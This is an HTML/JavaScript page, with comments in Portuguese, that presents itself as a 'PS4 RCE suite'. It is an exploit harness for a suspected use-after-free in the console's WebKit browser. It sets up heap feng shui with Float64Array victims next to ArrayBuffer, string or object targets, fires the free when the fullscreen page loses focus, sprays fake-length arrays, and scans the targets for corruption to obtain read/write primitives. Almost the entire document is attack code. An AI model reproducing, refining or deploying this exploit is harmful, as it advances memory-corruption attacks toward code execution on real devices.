<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE SUITE V6.0 - POLIGLOT HUNTER</title>
    <style>
        body { background-color: #050510; color: #aaooff; font-family: monospace; padding: 20px; font-size: 13px; }
        .dashboard { border: 1px solid #335; padding: 15px; background: #0a0a1a; margin-bottom: 15px; }
        h1 { color: #fff; border-bottom: 2px solid #55f; }
        button { width: 100%; padding: 12px; background: #224; color: #fff; border: 1px solid #55f; cursor: pointer; font-weight: bold; margin-bottom: 5px; }
        button:hover { background: #448; }
        button:disabled { background: #112; color: #556; border-color: #334; cursor: not-allowed; }
        #log { height: 400px; overflow-y: scroll; background: #000; border: 1px solid #335; padding: 5px; color: #ccc; }
        .hit { color: #0f0; font-weight: bold; background: #002200; padding: 2px; }
        .note { color: #ff0; }
    </style>
</head>
<body>

<h1>PS4 RCE SUITE V6.0 (POLIGLOT)</h1>
<p>Estratégia: Variar o <u>TIpo de Objeto Vizinho</u> para contornar o IsoHeap.</p>

<div class="dashboard">
    <div id="status">AGUARDANDO CONFIGURAÇÃO...</div>
    <br>
    <button onclick="setupTest('BUFFER')">TESTE A: ARRAYBUFFER (ByteLength Corruption)</button>
    <button onclick="setupTest('STRING')">TESTE B: JSSTRING (Pointer Corruption)</button>
    <button onclick="setupTest('OBJECT')">TESTE C: JSOBJECT (Property Corruption)</button>
    <br><hr style="border-color:#335">
    <button id="btnRun" onclick="runExploit()" disabled>INICIAR GATILHO (FULLSCREEN)</button>
</div>

<div id="log">Logs de execução...</div>

<script>
    const LOG = document.getElementById('log');
    function log(msg) { LOG.innerHTML = `[${Date.now()}] ${msg}<br>` + LOG.innerHTML; }

    var currentMode = "";
    var victims = [];   // O buraco (Sempre Float64Array para manter o UAF estável)
    var targets = [];   // O vizinho (Muda de tipo)
    var sprayStorage = [];
    
    // Constantes de Engenharia
    const COUNT = 5000;
    const SPRAY_VAL = 1337.1337; 
    const SPRAY_PATTERN = 2.121995791e-314; // 0x4141...

    function setupTest(mode) {
        currentMode = mode;
        document.getElementById('status').innerText = "MODO: " + mode + " - PREPARANDO HEAP...";
        document.getElementById('btnRun').disabled = false;
        log(`Configurando teste para alvo: ${mode}`);
        
        // Reset
        victims = [];
        targets = [];
        sprayStorage = [];

        // ALOCAÇÃO MISTA (Poliglot Heap Feng Shui)
        // Tentamos colocar o alvo escolhido logo após o Float64Array
        try {
            for(let i=0; i<COUNT; i++) {
                
                // 1. O VIZINHO (ALVO DIFERENTE)
                let t;
                if(mode === 'BUFFER') {
                    t = new ArrayBuffer(64); // Tamanho pequeno/médio
                    // Marcamos visualmente se possível (ArrayBuffer é opaco, checaremos o tamanho)
                } else if (mode === 'STRING') {
                    // String grande o suficiente para não ser "inline" mas pequena para estar no heap
                    t = "A".repeat(64) + i; 
                } else if (mode === 'OBJECT') {
                    t = { a: 0x1234, b: 0x5678, id: i, payload: "MARKER" };
                }
                targets.push(t);

                // 2. A VÍTIMA (Float64Array - Onde ocorre o UAF)
                // Usamos size 128 para tentar alinhar com os objetos acima
                let v = new Float64Array(128); 
                v.fill(1.1);
                victims.push(v);
            }
            log("Heap Híbrido alocado com sucesso.");
            log("Pressione INICIAR GATILHO e depois OPTIONS.");

        } catch(e) { log("Erro setup: " + e); }
    }

    function runExploit() {
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log(">>> BLUR DETECTADO. DISPARANDO UAF...");
            
            // 1. FREE (Apenas as vítimas Float64)
            victims = null;

            // 2. SPRAY AGRESSIVO
            // Usamos um spray maior para tentar cobrir qualquer coisa
            try {
                for(let k=0; k<8000; k++) {
                    let s = new Float64Array(160); // Um pouco maior que o buraco de 128
                    s.fill(SPRAY_PATTERN); // 0x4141...
                    // Adicionamos valores variados para tentar acertar headers
                    s[0] = 1.3906717577229e-309; // Fake Length
                    sprayStorage.push(s);
                }
            } catch(e) {}

            log("Spray concluído. Iniciando varredura...");
            setTimeout(checkCorruption, 200);
        };
    }

    function checkCorruption() {
        log("Analisando alvos vizinhos...");
        let found = false;

        if(currentMode === 'BUFFER') {
            for(let i=0; i<targets.length; i++) {
                // Checa se o tamanho do ArrayBuffer mudou (era 64)
                if(targets[i].byteLength !== 64) {
                    found = true;
                    reportSuccess(i, "BYTE_LENGTH", targets[i].byteLength);
                    break;
                }
            }
        } 
        else if (currentMode === 'STRING') {
            for(let i=0; i<targets.length; i++) {
                // Checa se a string corrompeu (comprimento ou conteúdo)
                if(targets[i].length !== (64 + i.toString().length)) {
                    found = true;
                    reportSuccess(i, "STRING_LENGTH", targets[i].length);
                    break;
                }
                // Checa se o conteúdo virou lixo (acesso inseguro, pode crashar o JS se ler)
                // Strings são perigosas de ler se corrompidas.
            }
        }
        else if (currentMode === 'OBJECT') {
            for(let i=0; i<targets.length; i++) {
                let obj = targets[i];
                // Checa se as propriedades mudaram
                if(obj.a !== 0x1234 || obj.b !== 0x5678) {
                    found = true;
                    reportSuccess(i, "PROPERTY_VAL", `A: ${obj.a}, B: ${obj.b}`);
                    break;
                }
                // Checa se a propriedade 'payload' sumiu ou mudou
                if(obj.payload !== "MARKER") {
                    found = true;
                    reportSuccess(i, "PROPERTY_PTR", obj.payload);
                    break;
                }
            }
        }

        if(!found) log("Nenhuma anomalia detectada nesta rodada.");
    }

    function reportSuccess(idx, type, val) {
        let msg = `<div class='hit'>!!! CORRUPÇÃO DETECTADA !!!</div>
                   <div>Index: ${idx}</div>
                   <div>Tipo: ${type}</div>
                   <div>Valor Novo: ${val}</div>
                   <div class='note'>ISSO É SUCESSO. Se conseguimos mudar o tamanho de um ArrayBuffer ou propriedades de um Objeto, temos primitivas de R/W.</div>`;
        log(msg);
        document.getElementById('status').innerText = "SUCESSO DE CORRUPÇÃO";
        document.body.style.background = "#200";
    }

</script>
</body>
</html>
